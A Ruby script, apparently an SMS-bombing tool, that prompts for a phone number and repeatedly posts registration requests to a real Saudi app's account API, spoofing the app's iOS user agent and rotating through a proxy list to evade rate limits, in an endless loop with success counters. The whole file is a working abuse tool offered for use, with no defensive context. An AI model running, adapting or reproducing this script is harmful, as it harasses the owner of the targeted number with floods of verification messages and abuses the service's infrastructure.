require 'httparty'

print "what is the number: "
number = gets.chomp
done = 0
error = 0
bad_proxy = 0
url = 'http://mtuwaiq.sa:705/api/v2/Account/Register'
headers = {
  'Content-Type' => 'application/json',
  'Accept' => '*/*',
  'Connection' => 'keep-alive',
  'Content-Length' => '58',
  'User-Agent' => 'Mandobak/4.1.4 (sa.mandobak.mandobak; build:2; iOS 16.3.1) Alamofire/5.6.2',
  'Accept-Language' => 'ar;q=1.0, ar;q=0.9',
  'Accept-Encoding' => 'br;q=1.0, gzip;q=0.9, deflate;q=0.8',
  'user-language' => 'ar'
}
payloads = [
  {
    'AcceptTermsConditions' => true,
    'MobileNumber' => "#{number}"
  }
]
file = File.readlines(File.join(__dir__, "proxy.txt"), chomp: true)
while true
  payloads.each do |payload|
    file.each do |proxy|
      proxy_host, proxy_port = proxy.split(":")

      proxy_options = {
        http_proxyaddr: proxy_host,
        http_proxyport: proxy_port.to_i
      }
      begin
        response = HTTParty.post(url, headers: headers, body: payload.to_json, timeout: 0.5, http_proxyaddr: proxy_host, http_proxyport: proxy_port.to_i)
        if response.code == 200
          done += 1
          puts "Done: #{done} | Error: #{error} | bad_proxy: #{bad_proxy}"
        elsif response.code != 200
          bad_proxy += 1
          puts "Done: #{done} | Error: #{error} | bad_proxy: #{bad_proxy}"
        else
          error += 1
          puts "Done: #{done} | Error: #{error} | bad_proxy: #{bad_proxy}"
        end
      rescue Net::ReadTimeout, Net::HTTPClientException, Net::OpenTimeout, Timeout::Error, Errno::ECONNRESET, EOFError, Errno::ECONNREFUSED => e
        bad_proxy += 1
        puts "Done: #{done} | Error: #{error} | bad_proxy: #{bad_proxy}"      
      end
    end
  end
end
file.close